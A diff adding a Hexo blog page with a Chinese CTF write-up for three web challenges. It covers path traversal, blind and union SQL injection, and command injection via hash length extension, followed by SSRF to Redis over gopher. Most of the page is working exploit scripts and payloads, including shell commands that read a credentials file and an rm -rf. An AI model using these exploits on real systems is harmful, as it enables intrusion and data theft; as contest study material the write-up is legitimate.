@@ -1,0 +1,635 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>安恒月赛7.25 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="安恒月赛7.25">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-07-25 16:04" pubdate>
+        2020年7月25日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">安恒月赛7.25</h1>
+            
+            <div class="markdown-body">
+              <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>文件包含+时间戳</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+
+files = base64.b64encode(<span class="hljs-string">&quot;ab/../../../../../../../../flag&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+fff=<span class="hljs-built_in">str</span>(files, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)
+print(fff)
+tt=<span class="hljs-built_in">int</span>(time.time())
+url=<span class="hljs-string">&quot;http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(tt,fff)
+print(url)
+print(requests.get(url).text)</code></pre>
+
+
+
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>无列名注入</p>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp2</span>():</span>
+    str1 = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span>
+    flag = <span class="hljs-string">&#x27;&#x27;</span>
+    flag_table_name = <span class="hljs-string">&#x27;flllaaaggg&#x27;</span>
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">39</span>):
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:
+            i = flag+i
+            paylaod = <span class="hljs-string">&quot;?id=1&#x27;/((select/**/1,&#x27;&#123;&#125;~&#x27;)/**/&gt;/**/(select/**/*/**/from/**/&#123;&#125;))%23&quot;</span>.<span class="hljs-built_in">format</span>(i,flag_table_name)
+            <span class="hljs-comment">#print(paylaod)</span>
+
+            r = requests.post(url=<span class="hljs-string">&quot;http://183.129.189.60:10004/&quot;</span>+paylaod)
+            <span class="hljs-comment"># print(&quot;http://183.129.189.60:10004/&quot;+paylaod)</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Array&#x27;</span> <span class="hljs-keyword">in</span> r.text:
+                flag=i
+                print(flag)
+                <span class="hljs-keyword">break</span>
+exp2()
+<span class="hljs-comment"># payload.replace(&#x27; &#x27;,&#x27;/**/&#x27;)  这里利用了1/0进行注入</span></code></pre>
+
+<p>或者直接联合注入查询</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">183.129</span>.<span class="hljs-number">189.60</span>:<span class="hljs-number">10004</span><span class="hljs-regexp">/?id=100’/</span>**<span class="hljs-regexp">/union/</span>**<span class="hljs-regexp">/select/</span>**<span class="hljs-regexp">/*,1/</span>**<span class="hljs-regexp">/from/</span>**/flllaaaggg%<span class="hljs-number">23</span></code></pre>
+
+
+
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><code>/static/js/app.4d269ccff489d8a081d1.js</code>注释有</p>
+<p><code>//# sourceMappingURL=app.4d269ccff489d8a081d1.js.map</code></p>
+<p>访问后能下载，在文件中发现/api/upload/list能看到所有文件的id和token，发现第一个是源码</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">183.129.189.60:10010</span>/api/upload?token=eyJzaWduIjoiWmpneE<span class="hljs-number">5</span>tRTVaVFJoWldRNVpXUXpZemM<span class="hljs-number">1</span>TVRZMU<span class="hljs-number">56</span>a<span class="hljs-number">3</span>pZelE<span class="hljs-number">0</span>TlRRNVlqZz<span class="hljs-number">0</span>iLCJpZCI<span class="hljs-number">6</span>Ik<span class="hljs-number">1</span>qVmpZamd<span class="hljs-number">6</span>WVRZdFkyRXhZUzAwWlRnekxUazFaR<span class="hljs-number">0</span>V<span class="hljs-number">0</span>TW<span class="hljs-number">1</span>RelpEaGtZemhoWW<span class="hljs-number">1</span>ZNCJ<span class="hljs-number">9</span></code></pre>
+
+<p>可以在压缩包里看到开发文档，储存的服务在storage_provider下，重点关注上传的源码，发现下载时id可注入命令，通过构造命令把结果写入文件下载，id在cookie里，验证可以用hash长度扩展攻击绕过，附上脚本</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-comment"># -*- coding:utf8 -*-</span>
+
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> hashpumpy
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> uuid
+
+<span class="hljs-keyword">import</span> requests
+
+host = sys.argv[<span class="hljs-number">1</span>]
+port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])
+command = sys.argv[<span class="hljs-number">3</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadTestFile</span>():</span>
+    r = requests.post(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload&quot;</span>,
+                      files=[(<span class="hljs-string">&#x27;file&#x27;</span>, (<span class="hljs-string">&#x27;testa.txt&#x27;</span>, <span class="hljs-string">&#x27;abcd&#x27;</span>))])
+    <span class="hljs-keyword">return</span> r.json()[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;token&#x27;</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rceToGetFile</span>(<span class="hljs-params">token</span>):</span>
+    filename = <span class="hljs-built_in">str</span>(uuid.uuid4())
+    data = json.loads(base64.b64decode(token))
+    <span class="hljs-built_in">id</span> = base64.b64decode(data[<span class="hljs-string">&#x27;id&#x27;</span>])
+    sign = base64.b64decode(data[<span class="hljs-string">&#x27;sign&#x27;</span>])
+    result = hashpumpy.hashpump(sign, <span class="hljs-built_in">id</span>,
+                                <span class="hljs-string">&#x27;;&#x27;</span> + command + <span class="hljs-string">&#x27; &gt;&gt; &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;zip &#x27;</span> + filename + <span class="hljs-string">&#x27;.zip &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;rm -rf &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;&#x27;</span>,
+                                <span class="hljs-number">32</span>)
+
+    data[<span class="hljs-string">&#x27;id&#x27;</span>] = base64.b64encode(result[<span class="hljs-number">1</span>]).decode()
+    data[<span class="hljs-string">&#x27;sign&#x27;</span>] = base64.b64encode(result[<span class="hljs-number">0</span>].encode()).decode()
+
+    token = base64.b64encode(json.dumps(data).encode())
+
+    <span class="hljs-keyword">try</span>:
+        requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;, timeout=<span class="hljs-number">5</span>)
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">return</span> filename
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getTargetFileToken</span>(<span class="hljs-params">filename</span>):</span>
+    r = requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload/list&quot;</span>)
+    data = r.json()[<span class="hljs-string">&#x27;data&#x27;</span>]
+    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:
+        <span class="hljs-keyword">if</span> item[<span class="hljs-string">&#x27;id&#x27;</span>] == filename:
+            <span class="hljs-keyword">return</span> item[<span class="hljs-string">&#x27;token&#x27;</span>]
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params">token</span>):</span>
+    r = requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;)
+
+    origin_text = r.text
+    <span class="hljs-keyword">return</span> origin_text
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    print(<span class="hljs-string">&quot;[*]上传测试文件，获取 Token 中....&quot;</span>)
+    token = uploadTestFile()
+    print(<span class="hljs-string">&quot;[+]Token:&quot;</span> + token)
+    print(<span class="hljs-string">&quot;[*]在 Token 的 ID 后追加字符串造成 RCE，并利用 Hash 长度扩展攻击来计算新的 sign。&quot;</span>)
+    filename = rceToGetFile(token)
+    print(<span class="hljs-string">&quot;[+]Flag 已被保存到服务器上的文件：&quot;</span> + filename)
+    print(<span class="hljs-string">&quot;[*]从文件列表中获取该文件的 Token：&quot;</span>)
+    flag_token = getTargetFileToken(filename)
+    print(<span class="hljs-string">&quot;[+]Token 获取成功，Token:&quot;</span> + flag_token)
+    print(<span class="hljs-string">&quot;[*]正在下载结果文件：&quot;</span>)
+    flag = getFlag(flag_token)
+    print(<span class="hljs-string">&quot;[+]结果下载成功，结果：&quot;</span> + flag)</code></pre>
+
+<p>找redis密码</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">python3</span> home* <span class="hljs-number">183.129.189.60</span> <span class="hljs-number">10010</span> <span class="hljs-string">&quot;mkdir /tmp/gs/ &amp;&amp; unzip -d /tmp/gs/ /usr/bin/flag_provider-0.0.1-SNAPSHOT.jar&quot;</span>
+<span class="hljs-attribute">python3</span> home* <span class="hljs-number">183.129.189.60</span> <span class="hljs-number">10010</span> <span class="hljs-string">&quot;find /tmp/gs -name application-prod.properties&quot;</span>
+<span class="hljs-attribute">python3</span> home* <span class="hljs-number">183.129.189.60</span> <span class="hljs-number">10010</span> <span class="hljs-string">&quot;cat /tmp/gs/BOOT-INF/classes/application-prod*&quot;</span></code></pre>
+
+<p>密码为glzjin_wants_a_girl_friend</p>
+<p>gopher打redis，构造下get flag</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">colors</span>:</span>
+    reset=<span class="hljs-string">&#x27;\033[0m&#x27;</span>
+    red=<span class="hljs-string">&#x27;\033[31m&#x27;</span>
+    green=<span class="hljs-string">&#x27;\033[32m&#x27;</span>
+    orange=<span class="hljs-string">&#x27;\033[33m&#x27;</span>
+    blue=<span class="hljs-string">&#x27;\033[34m&#x27;</span>
+
+<span class="hljs-built_in">print</span> colors.green + <span class="hljs-string">&quot;&quot;&quot;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">  ________              .__</span>
+<span class="hljs-string"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span>
+<span class="hljs-string">/   \  ___ /  _ \\\\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span>
+<span class="hljs-string">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \\</span>
+<span class="hljs-string"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span>
+<span class="hljs-string">        \/       |__|        \/     \/                 \/</span>
+<span class="hljs-string">&quot;&quot;&quot;</span> + <span class="hljs-string">&quot;\n\t\t&quot;</span> + colors.blue + <span class="hljs-string">&quot;Modified: &quot;</span> + colors.orange + <span class="hljs-string">&quot;$guoke1$&quot;</span> + <span class="hljs-string">&quot;\n&quot;</span> + colors.reset
+
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Redis</span>():</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_Redis_ReverseShell</span>():</span>
+
+        password = <span class="hljs-string">&quot;glzjin_wants_a_girl_friend&quot;</span>
+        server = <span class="hljs-string">&quot;0.0.0.0&quot;</span>
+
+        payload = <span class="hljs-string">&quot;&quot;&quot;*2\r</span>
+<span class="hljs-string">$3\r</span>
+<span class="hljs-string">get\r</span>
+<span class="hljs-string">$4\r</span>
+<span class="hljs-string">flag\r</span>
+<span class="hljs-string">*1\r</span>
+<span class="hljs-string">$4\r</span>
+<span class="hljs-string">quit\r</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&quot;&quot;&quot;</span>
+
+
+        authPrePayload = <span class="hljs-string">&#x27;&#x27;&#x27;*2\r</span>
+<span class="hljs-string">$4\r</span>
+<span class="hljs-string">AUTH\r</span>
+<span class="hljs-string">$&#x27;&#x27;&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(password)) + <span class="hljs-string">&#x27;&#x27;&#x27;\r</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>+  <span class="hljs-built_in">str</span>(password) +  <span class="hljs-string">&#x27;&#x27;&#x27;\r</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+        <span class="hljs-keyword">if</span> password != <span class="hljs-string">&#x27;&#x27;</span>:
+            payload  = authPrePayload + payload
+        finalpayload = urllib.quote_plus(payload).replace(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;%20&quot;</span>).replace(<span class="hljs-string">&quot;%2F&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>).replace(<span class="hljs-string">&quot;%25&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>).replace(<span class="hljs-string">&quot;%3A&quot;</span>,<span class="hljs-string">&quot;:&quot;</span>)
+        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\033[93m&quot;</span> +<span class="hljs-string">&quot;\nYour gopher link is ready to get Salve connect: \n&quot;</span>+ <span class="hljs-string">&quot;\033[0m&quot;</span>
+        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\033[04m&quot;</span> +<span class="hljs-string">&quot;gopher://&quot;</span> + server + <span class="hljs-string">&quot;:6379/_&quot;</span> + finalpayload+ <span class="hljs-string">&quot;\033[0m&quot;</span>
+
+
+    get_Redis_ReverseShell()
+
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    Redis()
+</code></pre>
+
+<p> 最后直接curl</p>
+<pre><code class="hljs shell">python3 home* 183.129.189.60 10010 &quot;curl gopher://redis:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%2426%0D%0Aglzjin_wants_a_girl_friend%0D%0A%2A2%0D%0A%243%0D%0Aget%0D%0A%244%0D%0Aflag%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A%0A&quot;</code></pre>
+
+<p>构造最后记得加quit</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/">安恒月赛</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/25/D3CTF-2019-Showhub/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[D3CTF 2019]Showhub</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/">
+                        <span class="hidden-mobile">[网鼎杯 2020 朱雀组]Think Java</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
